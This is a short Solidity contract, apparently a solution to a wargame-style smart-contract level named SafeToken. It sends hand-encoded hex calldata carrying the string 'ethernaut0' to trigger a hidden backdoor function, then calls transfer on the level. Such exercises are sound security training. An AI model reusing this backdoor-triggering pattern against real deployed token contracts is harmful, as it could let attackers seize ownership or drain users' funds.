// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../levels/SafeToken.sol';

contract SafeTokenAttack {
    function openBackdoor(address level) public {
        (bool success,) = level.call(hex"31eaf0aa0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a65746865726e6175743000000000000000000000000000000000000000000000");
        require(success, "call unsuccessful!");
    }

    function transferOwnerTokens(address level) public {
        SafeToken instance = SafeToken(level);
        instance.transfer(address(this),0);
    }
}
